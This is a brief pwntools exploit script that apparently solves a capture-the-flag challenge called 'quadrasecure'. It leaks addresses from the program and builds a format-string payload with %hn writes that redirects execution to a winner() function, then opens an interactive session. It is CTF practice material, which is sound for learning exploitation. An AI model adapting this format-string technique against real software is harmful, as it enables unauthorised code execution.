#!/usr/bin/env python

from pwn import *



## "%8$p" + "AAAA"
if len(sys.argv) < 2 :
    p = process("./quadrasecure")
else :
    p = remote("ctf.osusec.org", sys.argv[1])
p.recvuntil("You'll never be able to call winner(): ")
callee = int(p.recvn(10), 16)

p.recvuntil("You can send me your tears at this address: ")
addr = int(p.recvn(10), 16)

first = callee & 0xffff
second = ( 0x10000 + (callee >> 16) - first ) & 0xffff

payload  = "%" + str(first).rjust(6, "0") + "x"   # 7, 8
payload += "%0015$hn"                             # 9, 10
payload += "%" + str(second).rjust(6, "0") + "x"  # 11, 12
payload += "%0016$hn"                             # 13, 14
payload += p32(addr) + p32(addr+2)

with open("payload", "wb") as out :
    out.write(payload)
    out.close()

p.sendline(payload)
p.interactive()

